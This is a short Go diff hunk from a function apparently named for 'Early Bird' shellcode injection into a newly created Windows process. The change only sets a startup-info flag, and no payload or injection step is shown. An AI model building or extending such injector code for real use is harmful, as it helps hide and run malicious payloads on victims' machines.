@@ -38,7 +38,7 @@ func doEarlyBirdInject(targetExe string, sc []byte) error {
 	}
 
 	if hProc == 0 {
-		si := &startupInfoExW{cb: uint32(unsafe.Sizeof(startupInfoExW{}))}
+		si := &startupInfoExW{cb: uint32(unsafe.Sizeof(startupInfoExW{})), dwFlags: 0x00000001}
 		pi := processInformation{}
 
 		exePtr, _ := syscall.UTF16PtrFromString(exePath)
